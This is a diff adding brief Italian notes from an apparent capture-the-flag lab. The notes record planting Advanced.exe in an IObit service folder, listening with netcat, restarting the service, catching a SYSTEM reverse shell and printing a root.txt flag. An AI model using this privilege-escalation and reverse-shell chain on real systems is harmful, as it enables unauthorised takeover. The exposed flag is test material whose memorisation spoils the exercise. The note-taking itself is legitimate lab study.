@@ -1,0 +1,55 @@
+copiato il file Advanced.exe in :
+
+C:\Program Files (x86)\IObit
+
+
+move "C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Advanced.exe" .
+
+
+messo in ascolto netcat:
+
+# nc -nvlp 4443
+listening on [any] 4443 ...
+
+
+
+riavviato il servizio:
+
+C:\Program Files (x86)\IObit>sc stop AdvancedSystemCareService9
+sc stop AdvancedSystemCareService9
+[SC] ControlService FAILED 1062:
+
+The service has not been started.
+
+
+C:\Program Files (x86)\IObit>sc start AdvancedSystemCareService9
+sc start AdvancedSystemCareService9
+[SC] StartService FAILED 1053:
+
+The service did not respond to the start or control request in a timely fashion.
+
+
+
+GOT SHELL:
+
+connect to [10.8.147.132] from (UNKNOWN) [10.10.232.179] 49240
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>cd c:\users\administrator
+cd c:\users\administrator
+
+c:\Users\Administrator>cd Desktop
+cd Desktop
+
+c:\Users\Administrator\Desktop>type root.txt
+type root.txt
+9af5f314f57607c00fd09803a587db80
+c:\Users\Administrator\Desktop>exit
+exit
+
+
